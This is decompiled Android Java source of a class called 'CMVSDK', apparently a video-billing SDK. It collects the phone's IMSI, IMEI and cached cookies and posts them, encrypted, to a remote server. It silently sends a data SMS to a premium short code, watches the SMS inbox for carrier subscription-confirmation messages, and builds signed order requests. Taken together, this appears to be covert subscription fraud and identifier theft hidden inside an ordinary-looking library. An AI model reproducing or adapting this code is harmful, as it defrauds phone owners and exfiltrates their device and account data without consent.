package com.ddd.cmvsdk;

import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Base64;
import com.loopj.android.http.AsyncHttpClient;
import com.loopj.android.http.PersistentCookieStore;
import com.loopj.android.http.RequestParams;
import com.qdzg.yqwzo.manager.SDKManager;
import com.qdzg.yqwzo.manager.SecurityManager;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Random;
import org.apache.http.cookie.Cookie;

public class CMVSDK
{
  private static String C = "CMVSDK_BROADCAST_KEY";
  public static String a = "SMS_SEND_ACTIOIN";
  public static String b = "SMS_DELIVERED_ACTION";
  private static String c = "3.0.0";
  private static String d = "";
  private static int e = 0;
  private static List f = new ArrayList();
  private static CMVSDK g = null;
  private static Context h = null;
  private static PersistentCookieStore i = null;
  private static AsyncHttpClient j;
  private static String k = null;
  private static String l = null;
  private static String m = null;
  private static int n = 0;
  private static String o = null;
  private static String p = null;
  private static String q = "samsung_samsung_GT-N7108";
  private static String r = "";
  private static String s = "";
  private static String t = "";
  private static String u = null;
  private static String v;
  private static boolean w = false;
  private static boolean x = false;
  private PendingIntent A;
  private PendingIntent B;
  private Handler D = new b(this);
  private Map E = null;
  private String F = null;
  private int G = 0;
  private int H = 0;
  private CMVSDK.MyReceiver y;
  private l z = null;
  
  private CMVSDK() {}
  
  public static void a(int paramInt, String paramString)
  {
    Intent localIntent = new Intent(C);
    localIntent.putExtra("cmvsdk_id", paramInt);
    localIntent.putExtra("cmvsdk_contentid", m.e);
    localIntent.putExtra("cmvsdk_playurl", t);
    if (!TextUtils.isEmpty(paramString))
    {
      localIntent.putExtra("cmvsdk_result", paramString);
      h.sendBroadcast(localIntent);
    }
  }
  
  public static void a(String paramString, int paramInt)
  {
    SharedPreferences.Editor localEditor = h.getSharedPreferences("CMVSDK_SHAREDPREFERENCES", 0).edit();
    localEditor.putInt(paramString, paramInt);
    localEditor.commit();
  }
  
  public static boolean a(String paramString1, String paramString2)
  {
    return (paramString1 != null) && (paramString2 != null) && (paramString1.startsWith("10086")) && ((paramString2.contains("北方视讯")) || (paramString2.contains("成功订购")) || (paramString2.contains("10086901")));
  }
  
  public static String b(String paramString)
  {
    Object localObject3 = null;
    Object localObject1 = paramString;
    if (paramString != null)
    {
      localObject1 = paramString;
      if (paramString.contains("<![CDATA["))
      {
        localObject1 = paramString;
        if (paramString.contains("]]>")) {
          localObject1 = paramString.substring(paramString.indexOf("<![CDATA[") + 9, paramString.indexOf("]]>"));
        }
      }
    }
    int i1;
    Object localObject2;
    int i2;
    if (localObject1 != null)
    {
      paramString = "dfzyh";
      if (((String)localObject1).contains("dfzyh"))
      {
        paramString = "dfzyh";
        i1 = ((String)localObject1).indexOf(paramString);
        if (i1 <= 0) {
          break label344;
        }
        localObject2 = ((String)localObject1).substring(paramString.length() + i1).getBytes();
        i1 = 0;
        i2 = 0;
        paramString = null;
        if (i1 < localObject2.length) {
          break label184;
        }
        localObject1 = null;
      }
    }
    for (;;)
    {
      localObject2 = localObject3;
      if (paramString != null)
      {
        localObject2 = localObject3;
        if (localObject1 != null) {
          localObject2 = paramString + "|" + (String)localObject1;
        }
      }
      return localObject2;
      if (!((String)localObject1).contains("tt2")) {
        break;
      }
      paramString = "tt2";
      break;
      label184:
      int i5 = localObject2[i1];
      int i4;
      int i3;
      if (((i5 < 48) || (i5 > 57)) && ((i5 < 65) || (i5 > 90)))
      {
        i4 = i1;
        i3 = i2;
        localObject1 = paramString;
        if (i5 >= 97)
        {
          i4 = i1;
          i3 = i2;
          localObject1 = paramString;
          if (i5 > 122) {}
        }
      }
      else
      {
        if (i2 != 0) {
          break label300;
        }
        paramString = new byte[32];
        System.arraycopy(localObject2, i1, paramString, 0, 32);
        localObject1 = new String(paramString);
        i4 = i1 + 32;
        i3 = i2 + 1;
      }
      label300:
      do
      {
        i1 = i4 + 1;
        i2 = i3;
        paramString = (String)localObject1;
        break;
        i4 = i1;
        i3 = i2;
        localObject1 = paramString;
      } while (i2 != 1);
      localObject1 = new byte[11];
      System.arraycopy(localObject2, i1, localObject1, 0, 11);
      localObject1 = new String((byte[])localObject1);
      continue;
      label344:
      paramString = null;
      localObject1 = null;
    }
  }
  
  public static void b(String paramString1, String paramString2)
  {
    SharedPreferences.Editor localEditor = h.getSharedPreferences("CMVSDK_SHAREDPREFERENCES", 0).edit();
    localEditor.putString(paramString1, paramString2);
    localEditor.commit();
  }
  
  private void g(String paramString)
  {
    paramString = h("CMVSDK_CACHE_COOKIE_KEY");
    int i2;
    int i1;
    if ((paramString != null) && (paramString.contains("|")))
    {
      paramString = paramString.split("\\|");
      if ((paramString != null) && (paramString.length > 0))
      {
        i2 = paramString.length;
        i1 = 0;
      }
    }
    for (;;)
    {
      if (i1 >= i2) {
        return;
      }
      Object localObject = paramString[i1];
      if ((localObject != null) && (((String)localObject).trim().length() > 0))
      {
        localObject = new q((String)localObject);
        i.addCookie((Cookie)localObject);
      }
      i1 += 1;
    }
  }
  
  private static String h(String paramString)
  {
    return h.getSharedPreferences("CMVSDK_SHAREDPREFERENCES", 0).getString(paramString, null);
  }
  
  public static void order(Context paramContext, String paramString)
  {
    if (paramContext != null) {
      h = paramContext;
    }
    d = paramString;
    w = false;
    x = false;
    SecurityManager.initLib(h);
    if (g == null) {
      g = new CMVSDK();
    }
    if (f != null)
    {
      e = 0;
      f.clear();
      paramContext = g;
      j = u();
      Object localObject1 = g;
      paramContext = (TelephonyManager)h.getSystemService("phone");
      m = paramContext.getDeviceId();
      paramContext = paramContext.getSubscriberId();
      k = paramContext;
      l = o.a(paramContext);
      SecurityManager.init(k, n, 2);
      u = h.getPackageName();
      q = (Build.BRAND + "_" + Build.MANUFACTURER + "_" + Build.MODEL).replace(" ", "_");
      paramContext = h;
      if (paramContext == null) {
        break label552;
      }
      paramContext = o.a(o.a(paramContext));
      label199:
      v = o.a(paramContext);
      paramContext = new Intent(a);
      Object localObject2 = new Intent(b);
      ((CMVSDK)localObject1).A = PendingIntent.getBroadcast(h.getApplicationContext(), 0, paramContext, 0);
      ((CMVSDK)localObject1).B = PendingIntent.getBroadcast(h.getApplicationContext(), 0, (Intent)localObject2, 0);
      paramContext = new IntentFilter(a);
      ((CMVSDK)localObject1).y = new CMVSDK.MyReceiver((CMVSDK)localObject1);
      h.registerReceiver(((CMVSDK)localObject1).y, paramContext);
      ((CMVSDK)localObject1).z = new l((CMVSDK)localObject1, h.getApplicationContext(), ((CMVSDK)localObject1).D);
      h.getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, ((CMVSDK)localObject1).z);
      paramContext = g;
      int i1 = h.getSharedPreferences("CMVSDK_SHAREDPREFERENCES", 0).getInt("random", -1);
      localObject1 = h("imsi");
      localObject2 = h("mobile");
      String str1 = h("tokenString");
      String str2 = h("tokenValue");
      if ((localObject1 == null) || (!((String)localObject1).equals(k)) || (i1 < 0) || (str1 == null) || (str1 == null)) {
        break label557;
      }
      k = (String)localObject1;
      l = o.a((String)localObject1);
      n = i1;
      s = (String)localObject2;
      o = str1;
      p = str2;
      SecurityManager.init(k, n, 2);
    }
    for (;;)
    {
      paramContext.g(null);
      paramContext = new RequestParams();
      paramContext.put("imsi", k);
      paramContext.put("imei", m);
      paramContext.put("imsimd5", l);
      paramContext.put("paykey", paramString);
      paramString = SDKManager.getHelloUrl(0);
      j.post(paramString, paramContext, new d());
      return;
      e = 0;
      f = new ArrayList();
      break;
      label552:
      paramContext = null;
      break label199;
      label557:
      n = new Random().nextInt(9999);
      o = null;
      p = null;
    }
  }
  
  public static void setQ(String paramString)
  {
    r = paramString;
  }
  
  private static AsyncHttpClient u()
  {
    AsyncHttpClient localAsyncHttpClient = new AsyncHttpClient();
    localAsyncHttpClient.setTimeout(50000);
    i = new PersistentCookieStore(h);
    localAsyncHttpClient.setCookieStore(i);
    localAsyncHttpClient.addHeader("X_UP_CLIENT_CHANNEL_ID", m.g);
    localAsyncHttpClient.addHeader("x-up-bear-type", "WLAN");
    localAsyncHttpClient.addHeader("WDAccept-Encoding", "gzip,deflate");
    localAsyncHttpClient.setUserAgent(q);
    return localAsyncHttpClient;
  }
  
  public final void a()
  {
    String str = "mvwlan," + l + "," + n;
    SmsManager.getDefault().sendDataMessage("10658423", null, (short)0, str.getBytes(), this.A, this.B);
  }
  
  public final void a(int paramInt)
  {
    this.D.sendEmptyMessage(paramInt);
  }
  
  public final void a(String paramString)
  {
    try
    {
      RequestParams localRequestParams = new RequestParams();
      String str1 = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(c)).append("|").append(d).toString())).append("|").append(n).toString())).append("|").append(k).toString() + "|" + paramString;
      if (o == null) {
        str1 = str1 + "|null";
      }
      for (;;)
      {
        str1 = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(str1)).append("|").append(p).toString())).append("|").append(u).toString())).append("|").append(m.a).toString())).append("|").append(m.b).toString())).append("|").append(m.c).toString())).append("|").append(m.d).toString())).append("|").append(m.e).toString())).append("|").append(m.f).toString())).append("|").append(m.g).toString())).append("|").append(m.h).toString())).append("|").append(m.i).toString())).append("|").append(m.j).toString())).append("|").append(m.k).toString())).append("|").append(m.l).toString())).append("|").append(q).toString())).append("|").append(s).toString())).append("|").append(v).toString())).append("|").append(h("CMVSDK_CACHE_COOKIE_KEY")).toString() + "|" + t;
        SDKManager.getDesKey();
        localRequestParams.put("body", n.a(str1, SDKManager.getDesKey()));
        localRequestParams.put("logname", paramString);
        localRequestParams.put("paykey", d);
        if (!TextUtils.isEmpty(r)) {
          localRequestParams.put("q", r);
        }
        paramString = SDKManager.getHelloUrl(1);
        j.post(paramString, localRequestParams, new j(this));
        return;
        String str2 = Base64.encodeToString(o.getBytes(), 0);
        if (str2 == null) {
          str1 = str1 + "|null";
        } else {
          str1 = str1 + "|" + str2.trim();
        }
      }
      return;
    }
    catch (Exception paramString)
    {
      paramString.printStackTrace();
    }
  }
  
  public final void b()
  {
    try
    {
      RequestParams localRequestParams = new RequestParams();
      String str1 = SDKManager.getMI1(l, n);
      String str2 = SDKManager.getMI2(m.b, m.c);
      localRequestParams.put("q", str1);
      localRequestParams.put("mi", str2);
      str1 = SecurityManager.getUrl(m.a);
      j.post(str1, localRequestParams, new e(this));
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
  
  public final void c()
  {
    try
    {
      RequestParams localRequestParams = new RequestParams();
      String str1 = SDKManager.getMI1(l, n);
      String str2 = o.a(p + q + "1");
      str2 = SDKManager.rsaEncrypt("data/sdk/checkVersion.jsp?sdkVersion=" + m.l + "&channelId=" + m.g + "&packageName=" + m.f + "&packageSign=" + m.h + "&securityCode=" + m.i + "&permissionCode=1&scrkey=" + m.k + "&imsi=" + l + "&random=" + n + "&counter=1&tkInfo=" + str2);
      localRequestParams.put("q", str1);
      localRequestParams.put("mi", str2);
      str1 = SecurityManager.getUrl(m.a);
      j.post(str1, localRequestParams, new f(this));
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
  
  public final void d()
  {
    try
    {
      RequestParams localRequestParams = new RequestParams();
      String str1 = SDKManager.getMI1(l, n);
      String str2 = SDKManager.getMI3(m.b, m.e);
      localRequestParams.put("q", str1);
      localRequestParams.put("mi", str2);
      str1 = SecurityManager.getUrl(m.a);
      j.post(str1, localRequestParams, new g(this));
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
  
  public final void e()
  {
    label661:
    for (;;)
    {
      try
      {
        if ((this.F != null) && (this.E != null) && (this.E.size() > 0))
        {
          Object localObject = this.F.split("\\|");
          if ((localObject != null) && (localObject.length == 2))
          {
            RequestParams localRequestParams = new RequestParams();
            String str2 = SDKManager.getMI1(l, n);
            String str3 = (String)this.E.get("productId");
            String str4 = (String)this.E.get("tt");
            String str1 = (String)this.E.get("tt2");
            if (str1 != null) {
              break label661;
            }
            str1 = (String)this.E.get("dfzyh");
            String str5 = (String)this.E.get("ys");
            String str6 = localObject[0];
            str1 = o.a("647f0d4a6b8c27d_" + str6 + "_" + str4 + "_" + str5 + "_" + str1 + "_7e1eddadf7ae86713");
            str6 = q;
            String str7 = m.e;
            String str8 = m.d;
            localObject = localObject[1];
            str7 = o.a(new String[] { "contentId=" + str7, "nodeId=" + str8, "productId=" + str3, "ys=" + str5, "tt=" + str4 });
            localObject = o.a(str6 + str7 + (String)localObject);
            str6 = o.a(p + q + "1");
            str1 = SDKManager.rsaEncrypt("msp/sdkOrder.msp?nodeId=" + m.d + "&contentId=" + m.e + "&productId=" + str3 + "&tt=" + str4 + "&ys=" + str5 + "&packageName=" + m.f + "&packageSign=" + m.h + "&securityCode=" + m.i + "&permissionCode=1&sdkVersion=" + m.l + "&playerType=1&isSupContSet=1&cd=" + m.j + "&yt=" + str1 + "&oy=" + (String)localObject + "&scrkey=" + m.k + "&imsi=" + l + "&random=" + n + "&counter=1&tkInfo=" + str6);
            localRequestParams.put("q", str2);
            localRequestParams.put("mi", str1);
            str1 = SecurityManager.getUrl(m.a);
            j.post(str1, localRequestParams, new h(this));
          }
        }
        return;
      }
      catch (Exception localException)
      {
        localException.printStackTrace();
        return;
      }
    }
  }
  
  public final void f()
  {
    try
    {
      if ((t != null) && (t.startsWith("http://")))
      {
        String str = t.replace(".mp4.m3u8", ".mp4");
        j.get(str, new i(this));
      }
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
  
  public final void g()
  {
    this.G -= 1;
    int i1 = this.G;
    this.G = (i1 + 1);
    if (i1 < 3)
    {
      this.D.postDelayed(new k(this), 3000L);
      new StringBuilder(" doordererr").append(this.G);
      a(9, null);
      return;
    }
    new StringBuilder(" doordererr").append(this.G);
    a(9, "error");
  }
  
  public final void h()
  {
    int i1 = this.H;
    this.H = (i1 + 1);
    if (i1 < 3)
    {
      this.D.postDelayed(new c(this), 8000L);
      new StringBuilder(" gettokenerr").append(this.H);
      a(10, null);
      return;
    }
    new StringBuilder(" gettokenerr").append(this.H);
    a(10, "error");
  }
}
